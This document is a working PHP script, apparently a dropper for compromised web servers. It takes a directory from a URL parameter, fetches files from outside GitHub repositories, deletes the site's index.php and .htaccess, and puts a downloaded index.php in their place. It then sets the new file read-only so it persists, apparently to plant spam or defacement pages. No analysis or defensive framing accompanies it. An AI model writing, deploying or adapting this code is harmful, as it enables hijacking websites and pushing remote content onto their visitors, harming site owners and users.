<?php
// Function to download file with fallback methods
function downloadFile($url, $destination) {
    // Method 1: Try curl
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        $fp = fopen($destination, 'w');
        
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        
        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        curl_close($ch);
        fclose($fp);
        
        if ($result && $httpCode == 200 && file_exists($destination) && filesize($destination) > 0) {
            return true;
        }
        @unlink($destination);
    }
    
    // Method 2: Try wget via exec
    if (function_exists('exec')) {
        $output = [];
        $returnVar = 0;
        exec("wget -O " . escapeshellarg($destination) . " " . escapeshellarg($url) . " 2>&1", $output, $returnVar);
        
        if ($returnVar === 0 && file_exists($destination) && filesize($destination) > 0) {
            return true;
        }
        @unlink($destination);
    }
    
    // Method 3: Try file_get_contents
    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url);
        if ($content !== false && strlen($content) > 0) {
            if (file_put_contents($destination, $content) !== false) {
                return true;
            }
        }
    }
    
    return false;
}

// Get current user
$user = get_current_user();
$userHomeDir = '/home/' . $user;

// Get the target directory from GET parameter
$targetDir = isset($_GET['path']) ? $_GET['path'] : '';

if (empty($targetDir)) {
    die("Error: No path specified. Usage: code.php?path=/your/target/directory");
}

// Validate and sanitize the path
$targetDir = rtrim($targetDir, '/');

if (!is_dir($targetDir)) {
    die("Error: Directory does not exist: $targetDir");
}

if (!is_writable($targetDir)) {
    die("Error: Directory is not writable: $targetDir");
}

echo "Current User: $user<br>";
echo "User Home Directory: $userHomeDir<br>";
echo "Target Directory: $targetDir<br><br>";

// Step 1: Download index.txt to user home directory
echo "Step 1: Downloading index.txt to $userHomeDir<br>";
$indexTxtUrl = "https://raw.githubusercontent.com/seobela/bela/refs/heads/main/index.txt";
$indexTxtDest = $userHomeDir . "/index.txt";

if (downloadFile($indexTxtUrl, $indexTxtDest)) {
    echo "✓ Successfully downloaded index.txt to /var/tmp<br><br>";
} else {
    die("✗ Failed to download index.txt<br>");
}

// Step 2: Process files in target directory
echo "Step 2: Processing files in target directory<br>";

$indexPhpPath = $targetDir . '/index.php';
$htaccessPath = $targetDir . '/.htaccess';

// Change permissions to 0644 for index.php
if (file_exists($indexPhpPath)) {
    echo "Changing permissions for index.php to 0644...<br>";
    @chmod($indexPhpPath, 0644);
}

// Change permissions to 0644 for .htaccess
if (file_exists($htaccessPath)) {
    echo "Changing permissions for .htaccess to 0644...<br>";
    @chmod($htaccessPath, 0644);
}

// Delete index.php
if (file_exists($indexPhpPath)) {
    if (@unlink($indexPhpPath)) {
        echo "✓ Deleted index.php<br>";
    } else {
        echo "✗ Failed to delete index.php<br>";
    }
}

// Delete .htaccess
if (file_exists($htaccessPath)) {
    if (@unlink($htaccessPath)) {
        echo "✓ Deleted .htaccess<br>";
    } else {
        echo "✗ Failed to delete .htaccess<br>";
    }
}

echo "<br>";

// Step 3: Download new index.php
echo "Step 3: Downloading new index.php<br>";
$newIndexUrl = "https://raw.githubusercontent.com/ranasoham988-maker/zip/refs/heads/main/16/index.php";

if (downloadFile($newIndexUrl, $indexPhpPath)) {
    echo "✓ Successfully downloaded new index.php<br>";
    
    // Change permissions to 0444
    if (@chmod($indexPhpPath, 0444)) {
        echo "✓ Changed permissions for index.php to 0444<br>";
    } else {
        echo "✗ Failed to change permissions for index.php<br>";
    }
} else {
    die("✗ Failed to download new index.php<br>");
}

echo "<br>All operations completed successfully!";
?>
